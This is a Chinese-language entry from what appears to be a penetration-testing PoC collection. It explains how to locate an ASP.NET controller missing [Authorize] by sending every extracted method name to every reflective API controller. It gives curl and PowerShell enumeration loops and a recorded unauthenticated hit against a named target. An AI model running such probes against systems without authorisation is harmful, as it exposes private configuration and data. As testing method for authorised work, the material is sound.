# 同一 ApiInterface 跨控制器对照法：定位漏挂 [Authorize] 的控制器

- **code**: 同一-apiinterface-跨控制器对照法-定位漏挂-authorize-的控制器
- **kind**: script
- **category**: unauthorized
- **severity**: high
- **language**: bash
- **source**: self
- **verified**: 1
- **verified_note**: 在 tgt9942-com 靶标实测（203.0.113.73，Host: target65.example.com）：30 个方法名 × 4 控制器全矩阵请求后，`ApiInterface=systemseting` 在 `/api/NotLoggedInApi` 返回 **200 / 626 字节完整系统配置 JSON**（含 web_url=target67.example.com、phoneurl=wap1/Index、USDT 汇率），而同名方法在 `/api/MemberApi` 返回 74 字节登录跳转脚本、在 `/api/CashOperationApi` 与 `/api/RecordingApi` 均返回 `{"code":1002,"msg":"请登陆！"}` ⇒ 精确定位为该控制器漏挂 [Authorize]。另：不带 Content-Length 的 POST 会被 HTTP.sys 以 411 拒绝（易误判）。
- **path**: pocs/同一-apiinterface-跨控制器对照法-定位漏挂-authorize-的控制器/apiinterface-cross-controller-authorize-diff.md
- **tags**: unauthorized,aspnet,mvc,authorize,反射接口,对照实验
- **created_at**: 2026-09-28T22:41:39.437Z

## 描述

对反射式分发接口 `/api/<Controller>?ApiInterface=<Method>`，用“同一方法名打到所有控制器”的对照实验，把"疑似未授权"升级为"精确到控制器级的漏挂 [Authorize]"，避免误判为全站无鉴权或多报。

## 用法

```
1) 从前端 JS 提取全部 `ApiInterface=` 方法名与 `/api/<Controller>` 名；2) 对每个 (控制器, 方法名) 组合发 `POST /api/<C>?ApiInterface=<M>`，必须带 `-H "Content-Length: 0"`；3) 把响应分四类（带数据 / 请登陆 / 跳转脚本 / 接口不存在）；4) 挑一个"某控制器下有数据"的方法名，逐个打到**全部**控制器做对照——只有一个放行即证明是该控制器漏挂 [Authorize]；5) 把该对照表写进报告作为定性证据。
```

## 正文

```
# 方法名：同一 ApiInterface 跨控制器对照法 —— 精确定位“漏挂 [Authorize] 的控制器”

## 为什么需要这个方法
ASP.NET MVC 的“反射式分发”接口长这样：

```
POST /api/<Controller>?ApiInterface=<MethodName>
```

后端用 `ApiInterface` 的值反射调用同名方法。**授权检查通常写在控制器级（`[Authorize]` 特性）或每个 Action 上**，
因此同一个业务方法名在不同控制器下的权限可能完全不同 —— 有的控制器挂上了校验，有的漏了。

**只看单个控制器"返回了数据"是弱证据**（可能是全站无鉴权）；**跨控制器对照才能证明"是这一个控制器漏挂"** ——
定性从“疑似未授权”升级为“**精确到控制器级的授权缺失**”，报告里直接站得住。

## 完整步骤

### 1) 先从前端 JS 挖出全部控制器名与方法名
```bash
curl -s -H "Host: <命中子域>" "http://<源站IP>/<任意前端JS路径>" -o app.js
Select-String -Path app.js -Pattern 'ApiInterface=[A-Za-z0-9_]+' -AllMatches | % {$_.Matches} | % {$_.Value} | Sort-Object -Unique
Select-String -Path app.js -Pattern '"/api/[A-Za-z0-9_]+' -AllMatches      | % {$_.Matches} | % {$_.Value} | Sort-Object -Unique
```
本例从前端 `bicommon.js` 提取出 **30 个方法名 + 4 个控制器**
（NotLoggedInApi / MemberApi / CashOperationApi / RecordingApi）。

### 2) 做“控制器 × 方法名”全矩阵请求（只读，不带任何参数）
```powershell
# 关键：POST 必须带 Content-Length: 0（否则 HTTP.sys 直接回 411 Length Required，
# 请求根本到不了应用层，会误判为“接口不存在”）
$apis = Get-Content apis.txt
foreach($c in @("NotLoggedInApi","MemberApi","CashOperationApi","RecordingApi")){
  foreach($api in $apis){
    curl.exe -s -i --max-time 10 -H "Host: <命中子域>" -H "Content-Length: 0" `
      -H "X-Requested-With: XMLHttpRequest" -X POST "http://<源站IP>/api/$c`?ApiInterface=$api"
  }
}
```

### 3) 分类判定响应（四种典型结果）
| 响应 | 含义 |
|---|---|
| `200` + **带业务数据 JSON** | ⭐ **未授权命中**（该控制器该法未鉴权） |
| `200` + `{"code":1002,"msg":"请登陆！"}` | 有登录校验（正常） |
| `200` + `<script>top.location.href='/Home/Index'</script>` | 跳转式登录拦截（正常） |
| `200` + `{"code":1033,"msg":"接口不存在"}` | 反射分发有**方法白名单**，该方法不存在 |

### 4) ⭐ 对照实验（决定性证据）
**取同一个方法名**（本例 `systemseting`），打到所有控制器：

| 控制器 | `ApiInterface=systemseting` 响应 |
|---|---|
| **/api/NotLoggedInApi** | **200 / 626 字节 完整系统配置 JSON** ⭐ |
| /api/MemberApi | 200 / 74B `<script>top.location.href='/Home/Index';</script>` |
| /api/CashOperationApi | 200 / 44B `{"code":1002,"msg":"请登陆！"}` |
| /api/RecordingApi | 200 / 44B `{"code":1002,"msg":"请登陆！"}` |

⇒ **同一方法名在三个控制器被拦、仅一个放行** ⇒ 铁证：**`NotLoggedInApi` 漏挂 `[Authorize]`**，
而**不是**全站无鉴权。这条对照（同方法 × 全控制器）可直接写进报告。

## 关键坑
- **POST 必须带 `Content-Length: 0`**：Windows/HTTP.sys 站点的 POST 若不带，会返回
  `411 Length Required`（且 `Server: Microsoft-HTTPAPI/2.0`）—— 这是 **HTTP.sys 层**的拒绝，
  请求没到应用，**不要误判成“接口不存在”**。
- **不带任何参数**再打一遍：无参数时业务方法即使存在也无法真正执行（对写操作是天然的安全阀），
  可以放心把写类方法名也纳入枚举。
- **不要只测一个控制器就下结论**；也不要因为某个方法名"不存在"就断定它没用 ——
  它可能存在于另一个控制器。
- 组合法 = **穷尽式方法名枚举 + 全控制器交叉验证**，结论才能写成“穷尽枚举，无遗漏”。
```
